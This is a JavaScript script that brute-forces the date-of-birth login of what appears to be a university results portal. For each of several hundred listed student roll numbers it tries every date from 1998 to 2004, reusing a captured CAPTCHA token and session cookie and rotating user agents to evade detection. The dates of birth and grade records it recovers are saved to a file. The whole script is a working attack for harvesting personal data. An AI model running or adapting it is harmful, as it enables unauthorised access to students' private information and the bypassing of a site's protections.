const axios = require('axios');
const qs = require('qs');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');


// File path for storing all resolved data
const outputFilePath = path.join(__dirname, '3.txt');

// Function to read existing data from file
function readExistingData() {
  try {
    const data = fs.readFileSync(outputFilePath, 'utf8');
    return JSON.parse(data);
  } catch (err) {
    // If file doesn't exist or is empty, return an empty array
    return [];
  }
}

// Function to write resolved data to a single text file
function writeToFile(data) {
  const existingData = readExistingData();
  
  // Check if rollNo already exists in existingData
  const rollNoExists = Array.isArray(existingData) && existingData.some(entry => entry.rollNo === data.rollNo);
  
  if (!rollNoExists) {
    try {
      fs.writeFileSync(outputFilePath, JSON.stringify(data, null, 2) + '\n', { flag: 'a+' }); // 'a+' flag for appending
      console.log('Successfully appended data to resolved_data.txt');
    } catch (err) {
      console.error('Error writing data to file:', err);
    }
  } else {
    console.log(`Roll number ${data.rollNo} already exists in resolved_data.txt. Skipping duplicate entry.`);
  }
}

// Function to update DOB and SGPA data and append to the file
function updateStudentData(rollNo, dob, sgpa) {
  const data = {
    rollNo: rollNo,
    DOB: dob,
    SGPA: sgpa
  };

  writeToFile(data);
}



const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
];

function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}


async function solve(rollNo,day, month,year) {

  
let data = qs.stringify({
  '__EVENTTARGET': '',
  '__EVENTARGUMENT': '',
  '__VIEWSTATE': '/wEPDwULLTExMDg0MzM4NTIPZBYCAgMPZBYEAgMPZBYEAgkPDxYCHgdWaXNpYmxlaGRkAgsPDxYCHwBnZBYCAgEPDxYCHwBnZBYCAgMPDxYCHgdFbmFibGVkZ2RkAgkPZBYCAgEPZBYCZg9kFgICAQ88KwARAgEQFgAWABYADBQrAABkGAEFEmdyZFZpZXdDb25mbGljdGlvbg9nZI39oJgydt1DpqkTbfYVCIehpm4TLMtdl7PeRLzN+5Jy',
  '__VIEWSTATEGENERATOR': 'FF2D60E4',
  '__EVENTVALIDATION': '/wEdAAbVARScphHwmjwD865sI1EeWB/t8XsfPbhKtaDxBSD9Lx25Lt8Vu4DZSHACA6NZjXuO1N1XNFmfsMXJasjxX85jSqX/wPN6qcfKF0mMYn5Pzrqic3S0ZDjCzqE9M2ZhdeRT68jJfo8Qy8cvEUD7m7ars0BV+cLKRjL8DPXKB3128Q==',
  'txtRollNo': rollNo,
  'txtDOB': `${day}/${month}/${year}`,
  'g-recaptcha-response': '03AFcWeA7hLvGsRSdgaC9MhN5sTcRuglmMBo3820Fx9Ildn8mWsp_m8Zu2w10fPq_SGMHIspjtUUezrG_umJmVYxEh1RFyXL82VGzGFRAvFDFMRO_kYAc9flB14jOymAkINQ8uLFHlR6OVhjTzEzW47gp4J6QD8JIvUjqQMPi95GVAIMBIQWx9LfG2iBFYlSCH2Y7yVqI593Qb3jyZRPR85MeSRwUPTS5_rY0HWKdH7NeuW0SjtU-feTHF_xlNgfvcTode6F_jDzBAaDSck7P5lLYHS1wgobQmKHREOg_1E7qXYwMvWDNNA2p9px1GHEmvD25db7WyP2wIIIFPhFt4MrrKVoZuSxJkW8Cdj0jNDUDRK7-djCDFrMUYkpmiiheBt2jz7b5RBTe-H9MahQsokNd6vAyq_Oroba9SLEFvrE715778ZUUn9og9ldRS_14OrwUyFPQeLrgoAV2Gxs_vuINZIf86oIb-gxoUBBVultOyL2AGkJhiX5xER0Xd_U74YjoJKdkkVGvpH3RxFfU51BmItcB_K9iwKPbiKGlSk2sdsXTBM9taRhoLJ5JAG7QcmUrpF3H9mStT_fN9-VeL-BwGod8D9vkQwiLZXCLpNU8TGZ90bFQRoNaf_3rO7-42I-twbaZUonJDrxSoBqS6122y2-lESb-DciOFJUFsb9-73IqBUYbCzff33F67md_Gh66S_X4V0CERqIVGW-1u3BQ_tzM7WM8B8HOG-PS0eH1I4VpzDya1Aix2iwwYHsMohjErmw-SHulndvWn6JrSv2K4LYx2ydubX_ZY_pJy52vC0eoj7FSMdAyBBJ_PmVgWil3Ssdvl60UWgx3_LcKhJNWaMo28I2acdG6JXYkJEUGbTZA6LW-GhwGGVIgCXpZFlPecJ0OZBy2rjxhfUI6QEsXm1P6EkS_VIlkOHyumaMFy5s07chpCoFzIuXTAccEixxCeogw6KuiN_g_MuqVvpUHv3grrHLQu8_lOjIxrydsH7hCG4pEb9umVyOzy-R6ebjWtT6c2pN6rqP_zeaZ_iREWzZ_v5bt1LEFRD7_g9b91Rh9DQx2neRPeRv85ifWCSLtRl9ZF81enTK7kjrt8Y65fz7J7ciXREBavT8a7B49ApgcL-PshvYzZQIHu4uPW8fU-evOQy2cBFNdDe7476Vg3yfWF1i9u3xKSo-m5egu7vw1m6YA_ClvF1Onjgt5oa0BjzoKZpU1dVG6xPt_O5he99qDaQDeR7eKZ6unsXpl3J0R0G_QTQSIGv05dpj4c1P7WsNHvvRbt8LxbI8N3hpcHQktGoqh3hduYtIIBrXluPEVkGNZVU3j6m_MZ57b1nppYwqMhOeWEV4ltiw5idgpFeYdcCyYQJoCqzqPbwoI5bdXCUHkX4QsQS-tVle1xFQ_u2G4UWKI6d5uvAP2jtuBkcfxro04LHDaxby12sgivly_DKZRW4mAzfF5mCaqrp16_Pe6LoAImWwB60lBQjPEd2zckp0W5oyNPKCAOsrLEM6GpB41PO3NA6qMfeNqkPVy8V3PVpBMORZtYCfF8RF94DkBR59Za_-f38-dbf57aslP7IjKy-ycC8EyOH1tXEXUFZTE2ZRpuxRDoyfwN2mQUWfg6itNFi1mha1nU5ry_b4CkETmcIXQCPxW2kQ9Q-HppVlxaXSHWiu55jRt1M9Oa2oE5-fmlOnXcFxjEcEKuEVhPtZLqiPz7lsYPz5rVVkGYr6v4VuiPixWetQOaLYY7PG3pfga1JglOrUS9DVPji8Hvxvr1wJQryn5rDXEiQr4Zbj_327Ttzmly71ix7FZQ5y50kIgrAQyZ5EMrfjvQaJ5f1hTR7ohywVMxWkZHs24nF4bF2eN7',
  'btnSearch': 'खोजें',
  'hidForModel': '' 
});

let config = {
  method: 'post',
  
  maxBodyLength: Infinity,
  url: 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx',
  headers: { 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
    'Accept-Language': 'en-US,en;q=0.9', 
    'Cache-Control': 'max-age=0', 
    'Connection': 'keep-alive', 
    'Content-Type': 'application/x-www-form-urlencoded', 
    'Cookie': '_ga=GA1.3.1307891188.1718286218; ASP.NET_SessionId=pb45i2v2vxvaa1ykv1esb2an; _gid=GA1.3.1355207994.1719116977; _gat=1; _ga_P8H34B230T=GS1.3.1719116977.3.1.1719117085.0.0.0', 
    'Origin': 'https://oneview.aktu.ac.in', 
    'Referer': 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx', 
    'Sec-Fetch-Dest': 'document', 
    'Sec-Fetch-Mode': 'navigate', 
    'Sec-Fetch-Site': 'same-origin', 
    'Sec-Fetch-User': '?1', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': getRandomUserAgent(), 
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"', 
    'sec-ch-ua-mobile': '?1', 
    'sec-ch-ua-platform': '"Android"'
  },
  data : data
};
  try {
    const response = await axios.request(config);
    const parseData = parseHTML(JSON.stringify(response.data));
    return parseData;
  } catch (e) {
    return null;
  }

}

function cleanString(str) {
  return str.replace(/\\r|\\n/g, '').trim();
}


function parseHTML(htmlContent){
  const $ = cheerio.load(htmlContent);
  const rollNo = $('td:contains("RollNo")').next().next().text().trim() || 'N/A';
  const name = $('td:contains("Institute Code")').next().next().text().replace(/[0-9()]/g, '').trim().replace(/[\n\r\t]/g, '') || 'N/A';
  const branch = $('td:contains("Branch Code")').next().next().text().replace(/[0-9()]/g, '').trim() || 'N/A';
  const sgpa = $('td:contains("SGPA")').next().next().text().trim() || 'N/A';
  const fullName = $('td:contains("Name")').next().next().text().replace(/[0-9()]/g, '').trim().replace(/[\n\r\t]/g, '') || 'N/A';

  const names = fullName.split(/\s\s+/).map(name => name.trim()).filter(name => name);
  const firstName = names[9];
  let semesters = 'N/A';
  
  
  if(sgpa != 'N/A'){
    const sgpas = sgpa.match(/\d+\.\d+/g);
    semesters = sgpas.reduce((acc, sgpa, index) => {
      acc[`sem${index + 1}`] = parseFloat(sgpa);
      return acc;
    }, {});
  }

  

  if (rollNo == 'N/A' || name == 'N/A' || branch == 'N/A' || fullName == 'N/A' || !sgpa) {
    return null;
  }


  return {
    rollNo: cleanString(rollNo),
    instituteName: cleanString(name),
    branch: cleanString(branch),
    SGPA: semesters,
    fullName: cleanString(firstName)
  };

}

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));




async function main(rollNo) {
  // Define days in each month
  
  const daysInMonth = {
    1: 31,   // January
    2: 28,   // February (assuming non-leap year for simplicity)
    3: 31,   // March
    4: 30,   // April
    5: 31,   // May
    6: 30,   // June
    7: 31,   // July
    8: 31,   // August
    9: 30,   // September
    10: 31,  // October
    11: 30,  // November
    12: 31   // December
  };
  let solved = false;
  for (let year = 2004; year >= 1998; year--) {
    if (solved) {
      break;
    }
    for (let month = 1; month <= 12; month++) {
      if (solved) { // Exit if already solved 
        break;
      }
      const dataPromises = [];
      const maxDays = daysInMonth[month];
      console.log(`Trying for ${month}/${year}`);
      
      for (let day = 1; day <= maxDays; day++) {
        const dataPromise = solve(rollNo, day.toString(), month.toString(), year.toString())
          .then(data => {
            if (data) {
              console.log(`Resolved for ${day}/${month}/${year}:`, data);
              updateStudentData(rollNo, `${year}-${month}-${day}`, data.SGPA); // Update DOB and SGPA in MySQL
              solved = true;
            }
          })
          .catch(error => {
            console.error(`Error for ${day}/${month}/${year}:`, error);
          });

        dataPromises.push(dataPromise);
        await delay(150); // Add a delay to avoid overwhelming the server
      }

      // Wait for all promises in this month to resolve
      await Promise.all(dataPromises);
    }
  }
}


const rollNo_4thYear = [

  2000680540002,
  2000680540003,
  2000680540004,
  2000680540005,
  2000680540007,
  2000680540008,
  2000680540009,
  2000680540010,
  2000680540011,
  2000680540012,
  2000680540013,
  2000680540014,
  2000680540015,
  2000680540016,
  2000680540017,
  2000680540018,
  2000680540019,
  2000680540020,
  2000680540021,
  2000680540022,
  2000680540024,
  2000680540025,
  2000680540026,
  2000680540027,
  2000680540028,
  2000680540029,
  2000680540030,
  2000680540031,
  2000680540032,
  2000680540033,
  2000680510001,
  2000680510002,
  2000680510003,
  2000680510004,
  2000680510005,
  2000680510006,
  2000680510007,
  2000680510008,
  2000680510010,
  2000680510011,
  2100680519001,
  2100680519002,
  1900680000009,
  2000680000001,
  2000680000002,
  2000680000003,
  2000680000004,
  2000680000005,
  2000680000006,
  2000680000007,
  2000680000008,
  2000680000009,
  2000680000010,
  2000680000011,
  2000680000013,
  2000680000014,
  2000680000015,
  2000680000016,
  2000680000017,
  2000680000018,
  2000680000019,
  2000680000020,
  2000680000021,
  2000680000022,
  2000680000023,
  2100680009001,
  2100680009002,
  2100680009003,
  2100680009004,
  2100680009005,
  2100680009006,
  2000680100267,
  2000681520001,
  2000681520002,
  2000681520003,
  2000681520004,
  2000681520005,
  2000681520006,
  2000681520007,
  2000681520008,
  2000681520009,
  2000681520010,
  2000681520011,
  2000681520013,
  2000681520014,
  2000681520015,
  2000681520016,
  2000681520017,
  2000681520018,
  2000681520019,
  2000681520020,
  2000681520021,
  2000681520022,
  2000681520024,
  2000681520025,
  2000681520026,
  2000681520027,
  2000681520028,
  2000681520029,
  2000681520030,
  2000681520032,
  2000681520033,
  2000681520035,
  2000681520036,
  2000681520038,
  2000681520039,
  2000681520040,
  2000681520041,
  2000681520042,
  2000681520044,
  2000681520045,
  2000681520046,
  2000681520048,
  2000681520049,
  2000681520050,
  2000681520051,
  2000681520052,
  2000681520053,
  2100681529001,
  2000680100218,
  2000681520012,
  2000681520034,
  2000681530001,
  2000681530002,
  2000681530005,
  2000681530007,
  2000681530008,
  2000681530009,
  2000681530010,
  2000681530011,
  2000681530012,
  2000681530013,
  2000681530014,
  2000681530015,
  2000681530016,
  2000681530017,
  2000681530018,
  2000681530019,
  2000681530021,
  2000681530022,
  2000681530023,
  2000681530024,
  2000681530025,
  2000681530026,
  2000681530027,
  2000681530028,
  2000681530029,
  2000681530030,
  2000681530031,
  2000681530032,
  2000681530033,
  2000681530034,
  2000681530035,
  2000681530036,
  2000681530037,
  2000681530038,
  2000681530039,
  2000681530040,
  2000681530041,
  2000681530042,
  2000681530043,
  2000681530044,
  2000681530045,
  2000681530046,
  2000681530047,
  2000681530048,
  2000681530049,
  2000681530050,
  2000681530051,
  2000681530052,
  2000681530053,
  2000681530054,
  2000681530055,
  2000681530056,
  2000681530057,
  2000681540041,
  2100681539001,
  2000680100145,
  2000681520031,
  2000681540001,
  2000681540002,
  2000681540003,
  2000681540004,
  2000681540005,
  2000681540006,
  2000681540007,
  2000681540008,
  2000681540009,
  2000681540011,
  2000681540012,
  2000681540013,
  2000681540014,
  2000681540015,
  2000681540016,
  2000681540017,
  2000681540018,
  2000681540019,
  2000681540020,
  2000681540021,
  2000681540022,
  2000681540023,
  2000681540024,
  2000681540025,
  2000681540026,
  2000681540027,
  2000681540028,
  2000681540029,
  2000681540030,
  2000681540031,
  2000681540032,
  2000681540033,
  2000681540034,
  2000681540035,
  2000681540036,
  2000681540037,
  2000681540038,
  2000681540039,
  2000681540040,
  2000681540042,
  2000681540044,
  2000681540045,
  2000681540047,
  2000681540048,
  2000681540049,
  2000681540050,
  2100681549001,
  2000681550001,
  2000681550002,
  2000681550003,
  2000681550004,
  2000681550005,
  2000681550006,
  2000681550007,
  2000681550009,
  2000681550010,
  2000681550011,
  2000681550012,
  2000681550013,
  2000681550014,
  2000681550015,
  2000681550016,
  2000681550017,
  2000681550018,
  2000681550019,
  2000681550020,
  2000681550021,
  2000681550022,
  2000681550023,
  2000681550024,
  2000681550025,
  2000681550026,
  2000681550027,
  2000681550028,
  2000681550029,
  2000681550030,
  2000681550031,
  2000681550032,
  2000681550033,
  2000681550034,
  2000681550035,
  2000681550036,
  2100681559001,
  2000680110001,
  2000680110002,
  2000680110003,
  2000680110004,
  2000680110005,
  2000680110006,
  2000680110007,
  2000680110008,
  2000680110009,
  2000680110011,
  2000680110013,
  2000680110014,
  2000680110015,
  2000680110016,
  2000680110018,
  2000680110020,
  2000680110021,
  2000680110022,
  2000680110023,
  2000680110024,
  2000680110025,
  2000680110026,
  2000680110027,
  2000680110028,
  2000680110029,
  2000680110030,
  2000680110031,
  2000680110032,
  2000680110033,
  2000680110035,
  2000680110036,
  2000680110037,
  2000680110038,
  2100680119001,
  2000680100001,
  2000680100002,
  2000680100003,
  2000680100004,
  2000680100005,
  2000680100006,
  2000680100007,
  2000680100008,
  2000680100009,
  2000680100010,
  2000680100011,
  2000680100012,
  2000680100013,
  2000680100014,
  2000680100015,
  2000680100016,
  2000680100017,
  2000680100018,
  2000680100019,
  2000680100020,
  2000680100021,
  2000680100022,
  2000680100023,
  2000680100024,
  2000680100025,
  2000680100026,
  2000680100027,
  2000680100028,
  2000680100029,
  2000680100031,
  2000680100032,
  2000680100033,
  2000680100034,
  2000680100035,
  2000680100036,
  2000680100037,
  2000680100038,
  2000680100039,
  2000680100040,
  2000680100041,
  2000680100042,
  2000680100043,
  2000680100044,
  2000680100045,
  2000680100046,
  2000680100047,
  2000680100048,
  2000680100049,
  2000680100050,
  2000680100051,
  2000680100052,
  2000680100053,
  2000680100054,
  2000680100055,
  2000680100056,
  2000680100057,
  2000680100058,
  2000680100059,
  2000680100060,
  2000680100061,
  2000680100062,
  2000680100063,
  2000680100064,
  2000680100065,
  2000680100066,
  2000680100067,
  2000680100068,
  2000680100069,
  2000680100070,
  2000680100071,
  2000680100072,
  2000680100073,
  2000680100074,
  2000680100075,
  2000680100076,
  2000680100077,
  2000680100078,
  2000680100079,
  2000680100080,
  2000680100081,
  2000680100082,
  2000680100083,
  2000680100085,
  2000680100086,
  2000680100087,
  2000680100088,
  2000680100089,
  2000680100091,
  2000680100092,
  2000680100093,
  2000680100094,
  2000680100095,
  2000680100096,
  2000680100097,
  2000680100098,
  2000680100099,
  2000680100100,
  2000680100101,
  2000680100102,
  2000680100103,
  2000680100104,
  2000680100105,
  2000680100107,
  2000680100108,
  2000680100109,
  2000680100110,
  2000680100111,
  2000680100112,
  2000680100113,
  2000680100114,
  2000680100115,
  2000680100116,
  2000680100117,
  2000680100120,
  2000680100121,
  2000680100122,
  2000680100123,
  2000680100125,
  2000680100126,
  2000680100127,
  2000680100128,
  2000680100129,
  2000680100130,
  2000680100131,
  2000680100133,
  2000680100134,
  2000680100135,
  2000680100136,
  2000680100137,
  2000680100138,
  2000680100139,
  2000680100140,
  2000680100141,
  2000680100142,
  2000680100143,
  2000680100144,
  2000680100146,
  2000680100147,
  2000680100148,
  2000680100149,
  2000680100150,
  2000680100151,
  2000680100152,
  2000680100154,
  2000680100155,
  2000680100156,
  2000680100157,
  2000680100158,
  2000680100159,
  2000680100160,
  2000680100161,
  2000680100162,
  2000680100163,
  2000680100164,
  2000680100165,
  2000680100166,
  2000680100167,
  2000680100168,
  2000680100169,
  2000680100170,
  2000680100171,
  2000680100172,
  2000680100173,
  2000680100174,
  2000680100175,
  2000680100176,
  2000680100177,
  2000680100178,
  2000680100179,
  2000680100180,
  2000680100181,
  2000680100182,
  2000680100183,
  2000680100184,
  2000680100185,
  2000680100186,
  2000680100187,
  2000680100188,
  2000680100189,
  2000680100190,
  2000680100191,
  2000680100192,
  2000680100193,
  2000680100194,
  2000680100195,
  2000680100196,
  2000680100197,
  2000680100198,
  2000680100199,
  2000680100200,
  2000680100201,
  2000680100202,
  2000680100203,
  2000680100204,
  2000680100205,
  2000680100206,
  2000680100207,
  2000680100208,
  2000680100209,
  2000680100210,
  2000680100211,
  2000680100212,
  2000680100213,
  2000680100214,
  2000680100215,
  2000680100216,
  2000680100217,
  2000680100219,
  2000680100220,
  2000680100221,
  2000680100222,
  2000680100223,
  2000680100225,
  2000680100226,
  2000680100227,
  2000680100228,
  2000680100229,
  2000680100230,
  2000680100231,
  2000680100232,
  2000680100233,
  2000680100234,
  2000680100235,
  2000680100236,
  2000680100237,
  2000680100238,
  2000680100239,
  2000680100240,
  2000680100241,
  2000680100242,
  2000680100243,
  2000680100244,
  2000680100245,
  2000680100246,
  2000680100247,
  2000680100248,
  2000680100249,
  2000680100250,
  2000680100251,
  2000680100252,
  2000680100253,
  2000680100254,
  2000680100255,
  2000680100256,
  2000680100257,
  2000680100258,
  2000680100259,
  2000680100260,
  2000680100261,
  2000680100262,
  2000680100263,
  2000680100264,
  2000680100265,
  2000680100266,
  2000680100268,
  2000680100269,
  2000680100270,
  2000680100271,
  2000680100272,
  2000680100273,
  2000680100274,
  2000680100275,
  2000680100276,
  2000680100277,
  2000680100278,
  2000680100279,
  2000680100280,
  2000680100281,
  2000680100282,
  2000680100283,
  2000680100284,
  2000680100285,
  2000680100286,
  2000680100287,
  2000680100288,
  2000680100289,
  2000680100290,
  2000680100291,
  2000680100292,
  2000680100293,
  2000680100294,
  2000680100295,
  2000680100296,
  2000680100297,
  2000680100298,
  2000680100299,
  2000680100300,
  2000680100302,
  2000680100303,
  2000680100304,
  2000680100305,
  2000680100306,
  2000680100307,
  2000680100309,
  2000680100310,
  2000680100311,
  2000680100312,
  2000680100313,
  2000680100314,
  2000680100315,
  2000680100316,
  2000680100317,
  2000680100318,
  2000680100319,
  2000680100320,
  2000680100321,
  2000680100322,
  2000680100323,
  2000680100324,
  2000680100325,
  2000680100326,
  2000680100327,
  2000680100328,
  2000680100329,
  2000680100330,
  2000680100331,
  2000680100332,
  2000680100333,
  2000680100334,
  2000680100335,
  2000680100336,
  2000680100337,
  2000680100338,
  2000680100339,
  2000680100340,
  2000680100341,
  2000680100343,
  2000680100344,
  2000680100345,
  2000680100346,
  2000680100347,
  2000680100348,
  2000680100349,
  2000680100350,
  2000680100351,
  2000680100352,
  2000680100353,
  2000680100354,
  2000680100355,
  2000680100356,
  2000680100357,
  2000680100358,
  2000680100359,
  2000680100360,
  2000680100362,
  2000680100363,
  2000680100364,
  2000680100365,
  2000680100366,
  2000680100367,
  2000680100368,
  2000680100369,
  2000680100370,
  2000680100371,
  2000680100372,
  2000680100373,
  2000680100374,
  2000680100375,
  2000680100376,
  2000680100377,
  2000681520037,
  2000681520047,
  2000681530004,
  2000681530006,
  2000681530020,
  2000681540010,
  2000681540043,
  2000681540046,
  2100680109001,
  2100680109002,
  2100680109003,
  2100680109004,
  2100680109005,
  2100680109006,
  2100680109007,
  2100680109008,
  2100680109009,
  2100680109010,
  2100680109011,
  2100680109012,
  2100680109013,
  2100680109014,
  2100680109015,
  2100680109016,
  2100680109017,
  2100680109018,
  2100680109019,
  2100680109020,
  2100680109021,
  2100680109022,
  2100680109023,
  2100680109024,
  2100680109025,
  2100680109026,
  2100680109027,
  2100680109028,
  2100680109029,
  2100680109030,
  2100680109031,
  2100680109032,
  1900680310074,
  1900680310079,
  2000680310002,
  2000680310003,
  2000680310005,
  2000680310006,
  2000680310008,
  2000680310009,
  2000680310010,
  2000680310011,
  2000680310012,
  2000680310013,
  2000680310014,
  2000680310015,
  2000680310018,
  2000680310019,
  2000680310021,
  2000680310022,
  2000680310024,
  2000680310025,
  2000680310026,
  2000680310027,
  2000680310028,
  2000680310029,
  2000680310031,
  2000680310032,
  2000680310035,
  2000680310036,
  2000680310037,
  2000680310038,
  2000680310039,
  2000680310041,
  2000680310042,
  2000680310043,
  2000680310044,
  2000680310045,
  2000680310046,
  2000680310048,
  2000680310049,
  2000680310050,
  2000680310052,
  2000680310053,
  2000680310054,
  2000680310055,
  2000680310056,
  2000680310057,
  2000680310058,
  2000680310059,
  2000680310060,
  2000680310061,
  2000680310063,
  2000680310064,
  2000680310065,
  2000680310066,
  2000680310068,
  2000680310069,
  2000680310070,
  2000680310071,
  2000680310072,
  2000680310073,
  2000680310074,
  2000680310075,
  1900680200020,
  2000680200001,
  2000680200002,
  2000680200003,
  2000680200005,
  2000680200006,
  2000680200007,
  2000680200008,
  2000680200009,
  2000680200010,
  2000680200011,
  2000680200013,
  2000680200015,
  2000680200016,
  2000680200017,
  2000680200018,
  2000680200020,
  2000680200021,
  2000680200023,
  2000680200025,
  2000680200026,
  2000680200027,
  2000680200028,
  2000680200029,
  2000680200030,
  2100680209001,
  2100680209002,
  2100680209003,
  2100680209004,
  2100680209005,
  2100680209006,
  2000680130001,
  2000680130002,
  2000680130003,
  2000680130004,
  2000680130005,
  2000680130006,
  2000680130007,
  2000680130008,
  2000680130009,
  2000680130010,
  2000680130011,
  2000680130012,
  2000680130013,
  2000680130014,
  2000680130015,
  2000680130016,
  2000680130017,
  2000680130020,
  2000680130021,
  2000680130022,
  2000680130023,
  2000680130024,
  2000680130025,
  2000680130026,
  2000680130027,
  2000680130028,
  2000680130029,
  2000680130030,
  2000680130031,
  2000680130032,
  2000680130033,
  2000680130034,
  2000680130035,
  2000680130036,
  2000680130037,
  2000680130038,
  2000680130039,
  2000680130040,
  2000680130041,
  2000680130042,
  2000680130043,
  2000680130044,
  1706840030,
  1706840126,
  1900680400039,
  2000680400001,
  2000680400002,
  2000680400003,
  2000680400004,
  2000680400005,
  2000680400006,
  2000680400007,
  2000680400009,
  2000680400011,
  2000680400012,
  2000680400014,
  2000680400015,
  2000680400016,
  2000680400017,
  2000680400018,
  2000680400019,
  2000680400020,
  2000680400021,
  2100680409001,
  2100680409002,
  2100680409003,
  2100680409004

];


async function processRollNumbers(rollNos) {
  for (const rollNo of rollNos) {
    console.log(`Processing roll number: ${rollNo}`);
    await main(rollNo);
  }
}

processRollNumbers(rollNo_4thYear);